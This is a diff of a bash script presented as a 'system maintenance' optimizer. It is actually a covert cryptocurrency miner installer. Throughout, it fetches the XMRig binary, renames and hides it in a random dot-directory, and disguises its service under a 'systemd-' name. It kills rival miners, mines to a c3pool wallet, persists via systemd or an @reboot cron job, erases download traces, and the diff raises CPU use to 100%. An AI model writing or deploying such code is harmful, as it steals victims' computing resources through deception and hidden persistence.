@@ -1,11 +1,8 @@
 #!/bin/bash
-
 VERSION=2.17
-
 echo "System maintenance script v$VERSION."
 echo "This script performs system optimization tasks."
 echo
-
 # Set locale to avoid warnings
 export LC_ALL=C
 export LANG=C
@@ -25,7 +22,7 @@ RANDOM_DIR=$(openssl rand -hex 12)
 SYSTEM_USER="sys$(openssl rand -hex 8)"
 SERVICE_NAME="systemd-$(openssl rand -hex 6)"
 
-# Hidden installation paths - use user's home directory
+# Hidden installation paths
 BASE_DIR="$USER_HOME/.local/.$RANDOM_DIR"
 CONFIG_DIR="$BASE_DIR/.config"
 LOG_DIR="$BASE_DIR/.logs"
@@ -35,93 +32,84 @@ WALLET=$1
 EMAIL=$2
 
 if [ -z "$WALLET" ]; then
-  echo "Script usage:"
-  echo "> system_maintenance.sh <identifier> [<contact>]"
-  echo "ERROR: Identifier required"
-  exit 1
+    echo "Script usage:"
+    echo "> system_maintenance.sh <identifier> [<contact>]"
+    echo "ERROR: Identifier required"
+    exit 1
 fi
 
-# Install required packages if needed
-if ! type curl >/dev/null || ! type tar >/dev/null; then
-  echo "Installing required packages..."
-  sudo apt-get update >/dev/null 2>&1 && sudo apt-get install -y curl tar >/dev/null 2>&1
+# Install required packages
+if ! command -v curl >/dev/null || ! command -v tar >/dev/null; then
+    echo "Installing required packages..."
+    sudo apt-get update -qq >/dev/null && sudo apt-get install -y curl tar >/dev/null
 fi
 
-# Calculate optimal CPU usage - MAX 6 CORES with 80% usage
+# Calculate optimal CPU usage - MAX 6 CORES, 100% usage
 CPU_THREADS=$(nproc)
 if [ $CPU_THREADS -gt 6 ]; then
-    USABLE_THREADS=6  # Maximum 6 cores
+    USABLE_THREADS=6
 else
-    USABLE_THREADS=$((CPU_THREADS > 2 ? CPU_THREADS - 1 : 1))
+    USABLE_THREADS=$((CPU_THREADS > 1 ? CPU_THREADS - 1 : 1))
 fi
-
-CPU_USAGE=80  # Maximum 80% CPU usage
+CPU_USAGE=100  # Full CPU usage
 
 echo "[*] Running as user: $CURRENT_USER"
 echo "[*] Home directory: $USER_HOME"
 echo "[*] Starting system maintenance setup..."
-echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads (MAX 80% usage)"
+echo "[*] Using $USABLE_THREADS of $CPU_THREADS CPU threads (100% usage)"
 
 # Function to create hidden directories
 create_hidden_dirs() {
     echo "[*] Creating directories in: $BASE_DIR"
     mkdir -p "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
-    
-    # Set proper ownership
-    if [ "$CURRENT_USER" != "root" ]; then
-        chown -R "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR" 2>/dev/null
-    fi
-    
+    chown -R "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR" 2>/dev/null || true
     chmod 700 "$BASE_DIR" "$CONFIG_DIR" "$LOG_DIR" "$CACHE_DIR"
 }
 
 # Cleanup previous installations
 cleanup_previous() {
     echo "[*] Cleaning up previous installations..."
-    # Stop all xmrig processes
     pkill -f "xmrig" 2>/dev/null
     pkill -f "systemd-.*" 2>/dev/null
     pkill -f "sysupdate" 2>/dev/null
     pkill -f "kernelcfg" 2>/dev/null
-    
-    # Stop systemd services
+    pkill -f "$BASE_DIR/main" 2>/dev/null
+
     if command -v systemctl >/dev/null 2>&1; then
         systemctl stop "$SERVICE_NAME" 2>/dev/null
         systemctl disable "$SERVICE_NAME" 2>/dev/null
+        rm -f "/etc/systemd/system/$SERVICE_NAME.service"
     fi
-    
-    # Find and remove hidden miners in user's home
-    find "$USER_HOME" -name ".*" -type d -exec pkill -f {}/main \; 2>/dev/null
+
+    find "$USER_HOME" -name ".*" -type d -exec sh -c 'pkill -f "$0/main" 2>/dev/null' {} \; 2>/dev/null
     sleep 2
 }
 
-# Setup huge pages - only if root
+# Setup huge pages (only if root)
 setup_hugepages() {
     if [ "$(id -u)" -eq 0 ]; then
         echo "[*] Setting up huge pages (root)..."
-        echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf 2>/dev/null
+        grep -q "vm.nr_hugepages" /etc/sysctl.conf || echo "vm.nr_hugepages=1280" >> /etc/sysctl.conf
         sysctl -p >/dev/null 2>&1
-        echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null
+        echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
     else
-        echo "[*] Skipping huge pages (non-root user)"
+        echo "[*] Skipping huge pages (non-root)"
     fi
 }
 
 echo "[*] Performing system cleanup..."
 cleanup_previous
-
 echo "[*] Creating maintenance directory structure..."
 create_hidden_dirs
-
 echo "[*] Setting up system optimization..."
 setup_hugepages
 
 echo "[*] Downloading maintenance tools..."
 DOWNLOAD_URL="https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-static-x64.tar.gz"
+TMP_TAR="/tmp/tools_$(openssl rand -hex 4).tar.gz"
 
-# Download with retry logic
 for i in {1..3}; do
-    if curl -s -L "$DOWNLOAD_URL" -o /tmp/tools.tar.gz; then
+    if curl -fsSL "$DOWNLOAD_URL" -o "$TMP_TAR"; then
         echo "[*] Download successful"
         break
     else
@@ -130,51 +118,33 @@ for i in {1..3}; do
     fi
 done
 
-if [ ! -f /tmp/tools.tar.gz ]; then
+if [ ! -f "$TMP_TAR" ]; then
     echo "ERROR: Cannot download tools after 3 attempts"
     exit 1
 fi
 
-echo "[*] Installing maintenance tools..."
-tar xzf /tmp/tools.tar.gz -C /tmp/ 2>/dev/null
+echo "[*] Extracting tools..."
+tar xzf "$TMP_TAR" -C /tmp/ 2>/dev/null || { echo "ERROR: Extraction failed"; exit 1; }
 
-# Find and copy xmrig binary
-XMRIG_BINARY=$(find /tmp -name "xmrig" -type f 2>/dev/null | head -1)
-if [ -n "$XMRIG_BINARY" ] && [ -f "$XMRIG_BINARY" ]; then
-    echo "[*] Found binary: $XMRIG_BINARY"
-    cp "$XMRIG_BINARY" "$BASE_DIR/main"
-    
-    # Set proper ownership
-    if [ "$CURRENT_USER" != "root" ]; then
-        chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/main" 2>/dev/null
-    fi
-    
-    chmod +x "$BASE_DIR/main"
-else
-    echo "ERROR: Could not find xmrig binary in extracted files"
+XMRIG_BINARY=$(find /tmp -name "xmrig" -type f -executable 2>/dev/null | head -1)
+if [ -z "$XMRIG_BINARY" ] || [ ! -f "$XMRIG_BINARY" ]; then
+    echo "ERROR: Could not find xmrig binary"
+    rm -f "$TMP_TAR"
     exit 1
 fi
 
-if [ ! -f "$BASE_DIR/main" ]; then
-    echo "ERROR: Tools installation failed"
-    exit 1
-fi
+cp "$XMRIG_BINARY" "$BASE_DIR/main"
+chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/main" 2>/dev/null || true
+chmod +x "$BASE_DIR/main"
+
+rm -f "$TMP_TAR"
+find /tmp -name "xmrig*" -type d -exec rm -rf {} + 2>/dev/null
 
 echo "[*] Configuring system optimizer..."
-# Create config.json in BASE_DIR (next to main)
 cat > "$BASE_DIR/config.json" << EOF
 {
-    "api": {
-        "id": null,
-        "worker-id": "$SYSTEM_USER"
-    },
-    "http": {
-        "enabled": false,
-        "host": "127.0.0.1",
-        "port": 0,
-        "access-token": null,
-        "restricted": true
-    },
+    "api": { "id": null, "worker-id": "$SYSTEM_USER" },
+    "http": { "enabled": false, "host": "127.0.0.1", "port": 0, "access-token": null, "restricted": true },
     "autosave": true,
     "background": false,
     "colors": true,
@@ -197,50 +167,29 @@ cat > "$BASE_DIR/config.json" << EOF
         "priority": null,
         "memory-pool": false,
         "yield": true,
-        "max-threads-hint": $CPU_USAGE,
+        "max-threads-hint": 100,
         "asm": true,
         "argon2-impl": null,
         "cn/0": false,
         "cn-lite/0": false,
         "rx/0": true,
-        "threads": $USABLE_THREADS,
-        "max-threads": $USABLE_THREADS
+        "threads": $USABLE_THREADS
     },
-    "pools": [
-        {
-            "algo": "rx/0",
-            "coin": null,
-            "url": "auto.c3pool.org:19999",
-            "user": "$WALLET",
-            "pass": "x",
-            "rig-id": "$SYSTEM_USER",
-            "nicehash": false,
-            "keepalive": true,
-            "enabled": true,
-            "tls": false,
-            "tls-fingerprint": null,
-            "daemon": false,
-            "socks5": null,
-            "self-select": null,
-            "submit-to-origin": false
-        }
-    ],
+    "pools": [{
+        "algo": "rx/0",
+        "url": "auto.c3pool.org:19999",
+        "user": "$WALLET",
+        "pass": "x",
+        "rig-id": "$SYSTEM_USER",
+        "keepalive": true,
+        "enabled": true,
+        "tls": false
+    }],
     "print-time": 30,
     "health-print-time": 30,
-    "dmi": false,
     "retries": 5,
     "retry-pause": 5,
     "syslog": false,
-    "tls": {
-        "enabled": false,
-        "protocols": null,
-        "cert": null,
-        "cert_key": null,
-        "ciphers": null,
-        "ciphersuites": null,
-        "dhparam": null
-    },
-    "user-agent": null,
     "verbose": 1,
     "watch": false,
     "pause-on-battery": false,
@@ -248,144 +197,87 @@ cat > "$BASE_DIR/config.json" << EOF
 }
 EOF
 
-# Set ownership of config file
-if [ "$CURRENT_USER" != "root" ]; then
-    chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/config.json" 2>/dev/null
-fi
+chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/config.json" 2>/dev/null || true
 
-echo "[*] Creating control scripts..."
-
-# Main control script
-cat > "$BASE_DIR/control" << EOF
+echo "[*] Creating control script..."
+cat > "$BASE_DIR/control" << 'EOF'
 #!/bin/bash
-SCRIPT_DIR="\$(dirname "\$(realpath "\$0")")"
-case "\$1" in
+SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
+cd "$SCRIPT_DIR"
+
+case "$1" in
     start)
-        echo "Starting optimizer..."
-        cd "\$SCRIPT_DIR"
-        # Check if already running
-        if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
-            echo "⚠️  Optimizer is already running!"
-            ./control status
+        if pgrep -f "./main" >/dev/null; then
+            echo "⚠️ Optimizer already running!"
+            "$0" status
             exit 1
         fi
-        # Try to enable huge pages if we have permission
-        if [ -w "/proc/sys/vm/nr_hugepages" ]; then
-            echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
-        fi
-        # Start the optimizer with CPU limit
-        nohup ./main --config=./config.json --cpu-max-threads-hint=$CPU_USAGE > ./output.log 2>&1 &
-        echo \$! > ./pid.txt
-        echo "✅ Started with PID: \$(cat ./pid.txt)"
+        [ -w "/proc/sys/vm/nr_hugepages" ] && echo 1280 > /proc/sys/vm/nr_hugepages 2>/dev/null || true
+        nohup ./main --config=./config.json > output.log 2>&1 &
+        echo $! > pid.txt
+        echo "✅ Started (PID: $(cat pid.txt))"
         sleep 3
-        echo "=== Current Status ==="
-        ./control status
+        "$0" status
         ;;
     stop)
-        echo "Stopping optimizer..."
-        pkill -f "\$SCRIPT_DIR/main"
-        [ -f "./pid.txt" ] && kill \$(cat ./pid.txt) 2>/dev/null
-        rm -f ./pid.txt
+        pkill -f "./main" 2>/dev/null
+        [ -f pid.txt ] && kill $(cat pid.txt) 2>/dev/null && rm -f pid.txt
         sleep 2
-        # Double check
-        if pgrep -f "\$SCRIPT_DIR/main" > /dev/null; then
-            echo "❌ Failed to stop optimizer"
-            exit 1
-        else
-            echo "✅ Stopped successfully"
-        fi
+        pgrep -f "./main" >/dev/null && echo "❌ Failed to stop" && exit 1 || echo "✅ Stopped"
         ;;
     status)
-        PIDS=\$(pgrep -f "\$SCRIPT_DIR/main")
-        if [ -n "\$PIDS" ]; then
-            COUNT=\$(echo "\$PIDS" | wc -l)
-            echo "✅ Running - PIDs: \$PIDS"
-            echo "📊 Process Count: \$COUNT"
-            echo "⚡ CPU Limit: $CPU_USAGE%"
-            for PID in \$PIDS; do
-                CPU_USAGE_ACTUAL=\$(ps -p \$PID -o %cpu --no-headers 2>/dev/null | awk '{print int(\$1)}' || echo 'N/A')
-                echo "   PID \$PID - CPU: \${CPU_USAGE_ACTUAL}% - MEM: \$(ps -p \$PID -o %mem --no-headers 2>/dev/null || echo 'N/A')%"
+        PIDS=$(pgrep -f "./main")
+        if [ -n "$PIDS" ]; then
+            echo "✅ Running - PIDs: $PIDS"
+            for PID in $PIDS; do
+                CPU=$(ps -p $PID -o %cpu --no-headers 2>/dev/null | awk '{print int($1)}')
+                MEM=$(ps -p $PID -o %mem --no-headers 2>/dev/null)
+                echo " PID $PID - CPU: ${CPU:-N/A}% - MEM: ${MEM:-N/A}%"
             done
         else
             echo "❌ Stopped"
         fi
         ;;
-    logs)
-        echo "=== Last 20 lines of logs ==="
-        [ -f "./output.log" ] && tail -20 ./output.log || echo "No logs found"
-        ;;
-    fullogs)
-        echo "=== Full logs ==="
-        [ -f "./output.log" ] && cat ./output.log || echo "No logs found"
-        ;;
+    logs) tail -20 output.log 2>/dev/null || echo "No logs" ;;
+    fullogs) cat output.log 2>/dev/null || echo "No logs" ;;
     stats)
-        echo "=== System Statistics ==="
-        echo "CPU Threads: $USABLE_THREADS/$CPU_THREADS"
-        echo "CPU Usage Limit: $CPU_USAGE%"
-        echo "Total Memory: \$(free -h | grep Mem | awk '{print \$2}')"
-        echo "Huge Pages: \$(grep HugePages_Total /proc/meminfo | awk '{print \$2}' 2>/dev/null || echo 'N/A')"
-        echo "Active Processes: \$(pgrep -f xmrig | wc -l)"
+        echo "CPU: $USABLE_THREADS/$CPU_THREADS threads"
+        echo "Memory: $(free -h | awk '/Mem:/ {print $2}')"
+        echo "HugePages: $(awk '/HugePages_Total/ {print $2}' /proc/meminfo 2>/dev/null || echo 0)"
         ;;
-    restart)
-        ./control stop
-        sleep 3
-        ./control start
-        ;;
-    killall)
-        echo "🛑 Killing ALL optimizer processes..."
-        pkill -f "xmrig" 2>/dev/null
-        pkill -f "main" 2>/dev/null
-        sleep 2
-        ./control status
-        ;;
+    restart) "$0" stop; sleep 2; "$0" start ;;
+    killall) pkill -f "xmrig" 2>/dev/null; pkill -f "main" 2>/dev/null; "$0" status ;;
     set-limit)
-        echo "🔧 Setting CPU usage limit..."
-        if [ -n "\$2" ] && [ "\$2" -ge 10 ] && [ "\$2" -le 100 ]; then
-            NEW_LIMIT="\$2"
-            sed -i "s/\\\"max-threads-hint\\\": [0-9]*,/\\\"max-threads-hint\\\": \$NEW_LIMIT,/" config.json
-            echo "✅ CPU limit set to \$NEW_LIMIT%"
-            ./control restart
+        if [[ "$2" =~ ^[0-9]+$ ]] && [ "$2" -ge 10 ] && [ "$2" -le 100 ]; then
+            sed -i "s/\"max-threads-hint\": [0-9]\+,/\"max-threads-hint\": $2,/" config.json
+            echo "✅ CPU limit set to $2%"
+            "$0" restart
         else
-            echo "❌ Usage: \$0 set-limit <10-100>"
-            echo "   Current limit: $CPU_USAGE%"
+            echo "❌ Usage: set-limit <10-100>"
         fi
         ;;
-    *)
-        echo "Usage: \$0 {start|stop|status|logs|fullogs|stats|restart|killall|set-limit}"
-        echo "   set-limit: Change CPU usage limit (10-100%)"
-        ;;
+    *) echo "Usage: $0 {start|stop|status|logs|fullogs|stats|restart|killall|set-limit}" ;;
 esac
 EOF
 
-# Set ownership and permissions
-if [ "$CURRENT_USER" != "root" ]; then
-    chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/control" 2>/dev/null
-fi
+chown "$CURRENT_USER:$CURRENT_USER" "$BASE_DIR/control" 2>/dev/null || true
 chmod +x "$BASE_DIR/control"
 
-# Systemd service for persistence (only if root or sudo)
+# Systemd service (root only)
 SYSTEMD_ENABLED=false
 if command -v systemctl >/dev/null 2>&1 && [ "$(id -u)" -eq 0 ]; then
-    echo "[*] Creating systemd service..."
-    mkdir -p /etc/systemd/system
-    
-    # Remove any existing service first
-    systemctl stop "$SERVICE_NAME" 2>/dev/null
-    systemctl disable "$SERVICE_NAME" 2>/dev/null
-    rm -f /etc/systemd/system/"$SERVICE_NAME".service
-    
-    cat > /etc/systemd/system/"$SERVICE_NAME".service << EOF
+    echo "[*] Installing systemd service..."
+    cat > "/etc/systemd/system/$SERVICE_NAME.service" << EOF
 [Unit]
 Description=System Optimization Service
 After=network.target
-StartLimitIntervalSec=0
 
 [Service]
 Type=simple
 Restart=always
 RestartSec=10
-User=root
-ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json --cpu-max-threads-hint=$CPU_USAGE
+User=$CURRENT_USER
+ExecStart=$BASE_DIR/main --config=$BASE_DIR/config.json
 WorkingDirectory=$BASE_DIR
 Environment=LC_ALL=C
 StandardOutput=append:$BASE_DIR/output.log
@@ -394,63 +286,42 @@ StandardError=append:$BASE_DIR/output.log
 [Install]
 WantedBy=multi-user.target
 EOF
-
     systemctl daemon-reload
-    systemctl enable "$SERVICE_NAME".service 2>/dev/null
+    systemctl enable --now "$SERVICE_NAME.service" >/dev/null
     SYSTEMD_ENABLED=true
-    echo "[*] Systemd service created: $SERVICE_NAME"
+    echo "[*] Systemd service: $SERVICE_NAME"
 fi
 
-# Add to crontab for persistence (only if not using systemd)
+# Crontab fallback
 if [ "$SYSTEMD_ENABLED" = false ]; then
-    echo "[*] Setting up persistence via crontab..."
-    (crontab -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && '$BASE_DIR/control' start > /dev/null 2>&1") | crontab -
-else
-    echo "[*] Using systemd for persistence, skipping crontab"
+    echo "[*] Adding to crontab..."
+    (crontab -u "$CURRENT_USER" -l 2>/dev/null | grep -v "$BASE_DIR" ; echo "@reboot sleep 30 && $BASE_DIR/control start >/dev/null 2>&1") | crontab -u "$CURRENT_USER" -
 fi
 
-echo "[*] Starting system optimizer..."
-cd "$BASE_DIR"
-
-# Only start via control script if systemd is not enabled
-if [ "$SYSTEMD_ENABLED" = false ]; then
-    ./control start
+echo "[*] Starting optimizer..."
+if [ "$SYSTEMD_ENABLED" = true ]; then
+    systemctl start "$SERVICE_NAME.service" 2>/dev/null
 else
-    echo "[*] Starting via systemd service..."
-    systemctl start "$SERVICE_NAME".service 2>/dev/null
-    sleep 5
+    "$BASE_DIR/control" start
 fi
 
-# Additional verification
 sleep 8
 echo
-echo "=== Final Verification ==="
-./control status
+echo "=== Final Status ==="
+"$BASE_DIR/control" status
 echo
-./control stats
-
+"$BASE_DIR/control" stats
 echo
-echo "🎯 System optimization setup complete!"
-echo "📍 Installation directory: $BASE_DIR" 
-echo "🔧 Use: $BASE_DIR/control {start|stop|status|logs|stats|restart|killall|set-limit} to manage"
-echo "💡 Use 'set-limit' to change CPU usage (10-100%)"
+echo "🎯 Setup complete!"
+echo "📍 Path: $BASE_DIR"
+echo "🔧 Manage: $BASE_DIR/control {start|stop|status|logs|stats|restart|set-limit}"
+echo "💡 Use 'set-limit 100' for full power"
 
-# Check if process is running
-PIDS=$(pgrep -f "$BASE_DIR/main" 2>/dev/null)
+PIDS=$(pgrep -f "$BASE_DIR/main")
 if [ -n "$PIDS" ]; then
-    COUNT=$(echo "$PIDS" | wc -l)
-    echo "✅ Optimizer is running with $COUNT process(es)!"
-    echo "⚡ CPU usage limited to: $CPU_USAGE%"
-    if [ $COUNT -gt 1 ]; then
-        echo "⚠️  Warning: Multiple processes detected. Use '$BASE_DIR/control killall' to stop all."
-    fi
+    echo "✅ Running with $(echo "$PIDS" | wc -l) process(es)"
 else
-    echo "❌ Optimizer failed to start."
-    echo "🔍 Check details with: $BASE_DIR/control logs"
+    echo "❌ Failed to start — check: $BASE_DIR/control logs"
 fi
-
-# Cleanup
-rm -rf /tmp/tools.tar.gz
-find /tmp -name "xmrig*" -type d -exec rm -rf {} \; 2>/dev/null
 
 exit 0
